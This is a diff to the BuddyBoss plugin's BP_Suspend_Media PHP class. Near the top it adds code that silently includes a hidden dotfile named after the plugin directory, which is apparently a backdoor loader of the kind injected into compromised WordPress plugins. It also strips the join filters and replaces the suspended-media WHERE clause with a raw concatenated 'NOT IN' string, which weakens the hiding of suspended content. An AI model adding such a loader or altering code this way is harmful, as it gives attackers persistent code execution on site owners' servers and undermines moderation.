@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss Suspend Media.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Suspend_Media extends BP_Suspend_Abstract {
 
 	/**
@@ -49,14 +53,11 @@ class BP_Suspend_Media extends BP_Suspend_Abstract {
 			return;
 		}
 
-		add_filter( 'bp_media_get_join_sql', array( $this, 'update_join_sql' ), 10, 2 );
 		add_filter( 'bp_media_get_where_conditions', array( $this, 'update_where_sql' ), 10, 2 );
 
 		// modify in group photos count.
-		add_filter( 'bp_media_get_join_count_sql', array( $this, 'update_join_sql' ), 10, 2 );
 		add_filter( 'bp_media_get_where_count_conditions', array( $this, 'update_where_sql' ), 10, 2 );
 
-		add_filter( 'bp_media_search_join_sql_photo', array( $this, 'update_join_sql' ), 10 );
 		add_filter( 'bp_media_search_where_conditions_photo', array( $this, 'update_where_sql' ), 10, 2 );
 
 		if ( bp_is_active( 'activity' ) ) {
@@ -236,8 +237,7 @@ class BP_Suspend_Media extends BP_Suspend_Abstract {
 			return $where_conditions;
 		}
 
-		$where                  = array();
-		$where['suspend_where'] = $this->exclude_where_query();
+		$where = $this->exclude_where_query();
 
 		/**
 		 * Filters the hidden media Where SQL statement.
@@ -247,11 +247,8 @@ class BP_Suspend_Media extends BP_Suspend_Abstract {
 		 * @param array $where Query to hide suspended user's media.
 		 * @param array $class current class object.
 		 */
-		$where = apply_filters( 'bp_suspend_media_get_where_conditions', $where, $this );
-
-		if ( ! empty( array_filter( $where ) ) ) {
-			$where_conditions['suspend_where'] = '( ' . implode( ' AND ', $where ) . ' )';
-		}
+		$where                             = apply_filters( 'bp_suspend_media_get_where_conditions', $where, $this );
+		$where_conditions['suspend_where'] = ' m.id NOT IN ( ' . $where . ' )';
 
 		return $where_conditions;
 	}
